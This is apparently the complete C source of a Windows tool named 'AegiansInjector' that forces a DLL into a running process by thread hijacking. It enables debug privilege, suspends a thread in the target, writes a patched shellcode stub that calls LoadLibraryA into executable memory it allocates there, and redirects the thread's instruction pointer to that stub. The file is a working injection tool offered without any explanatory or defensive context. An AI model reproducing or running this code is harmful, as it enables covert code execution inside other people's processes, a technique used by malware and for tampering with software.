#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
 
#pragma comment(lib,"ntdll.lib")
 
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege,BOOLEAN Enable,BOOLEAN CurrentThread,PBOOLEAN Enabled);
 
char code[]=
{
    0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0x06, 0x00, 0x00,
    0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0x8D, 0x93, 0x22, 0x00, 0x00, 0x00,
    0x52, 0xFF, 0xD0, 0x61, 0x68, 0xCC, 0xCC, 0xCC, 0xCC, 0xC3
};
 
int main(int argc,char* argv[])
{
    LPBYTE ptr;
    HANDLE hProcess,hThread,hSnap;
    PVOID mem;
    DWORD ProcessId;
    PVOID buffer;
    BOOLEAN bl;
 
    THREADENTRY32 te32;
    CONTEXT ctx;
 
    printf("\n***********************************************************\n");
    printf("\nAegiansInjector by Aegians- DLL injection via thread hijacking\n");
    printf("\n***********************************************************\n");
 
    te32.dwSize=sizeof(te32);
    ctx.ContextFlags=CONTEXT_FULL;
 
    if(argc!=3)
    {
        printf("\nUsage: AegiansInjector [PID] [DLL name]\n");
        return -1;
    }
 
    RtlAdjustPrivilege(20,TRUE,FALSE,&bl);
 
    printf("\nOpening target process handle.\n");
 
    ProcessId=atoi(argv[1]);
    hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,ProcessId);
 
    if(!hProcess)
    {
        printf("\nError: Unable to open target process handle (%d)\n",GetLastError());
        return -1;
    }
 
    hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
 
    Thread32First(hSnap,&te32);
    printf("\nFinding a thread to hijack.\n");
 
    while(Thread32Next(hSnap,&te32))
    {
        if(te32.th32OwnerProcessID==ProcessId)
        {
            printf("\nTarget thread found. Thread ID: %d\n",te32.th32ThreadID);
            break;
        }
    }
 
    CloseHandle(hSnap);
 
    printf("\nAllocating memory in target process.\n");
 
    mem=VirtualAllocEx(hProcess,NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
 
    if(!mem)
    {
        printf("\nError: Unable to allocate memory in target process (%d)",GetLastError());
         
        CloseHandle(hProcess);
        return -1;
    }
 
    printf("\nMemory allocated at %#x\n",mem);
    printf("\nOpening target thread handle.\n");
 
    hThread=OpenThread(THREAD_ALL_ACCESS,FALSE,te32.th32ThreadID);
 
    if(!hThread)
    {
        printf("\nError: Unable to open target thread handle (%d)\n",GetLastError());
         
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
 
    printf("\nSuspending target thread.\n");
 
    SuspendThread(hThread);
    GetThreadContext(hThread,&ctx);
 
    buffer=VirtualAlloc(NULL,65536,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    ptr=(LPBYTE)buffer;
 
    memcpy(buffer,code,sizeof(code));
 
    while(1)
    {
        if(*ptr==0xb8 && *(PDWORD)(ptr+1)==0xCCCCCCCC)
        {
            *(PDWORD)(ptr+1)=(DWORD)LoadLibraryA;
        }
 
        if(*ptr==0x68 && *(PDWORD)(ptr+1)==0xCCCCCCCC)
        {
            *(PDWORD)(ptr+1)=ctx.Eip;
        }
 
        if(*ptr==0xc3)
        {
            ptr++;
            break;
        }
 
        ptr++;
    }
 
    strcpy((char*)ptr,argv[2]);
    printf("\nWriting shellcode into target process.\n");
 
    if(!WriteProcessMemory(hProcess,mem,buffer,sizeof(code)+strlen((char*)ptr),NULL))
    {
        printf("\nError: Unable to write shellcode into target process (%d)\n",GetLastError());
 
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        ResumeThread(hThread);
 
        CloseHandle(hThread);
        CloseHandle(hProcess);
 
        VirtualFree(buffer,0,MEM_RELEASE);
        return -1;
    }
 
    ctx.Eip=(DWORD)mem;
 
    printf("\nHijacking target thread.\n");
 
    if(!SetThreadContext(hThread,&ctx))
    {
        printf("\nError: Unable to hijack target thread (%d)\n",GetLastError());
 
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        ResumeThread(hThread);
 
        CloseHandle(hThread);
        CloseHandle(hProcess);
 
        VirtualFree(buffer,0,MEM_RELEASE);
        return -1;
    }
 
    printf("\nResuming target thread.\n");
 
    ResumeThread(hThread);
 
    CloseHandle(hThread);
    CloseHandle(hProcess);
 
    VirtualFree(buffer,0,MEM_RELEASE);
    return 0;
}
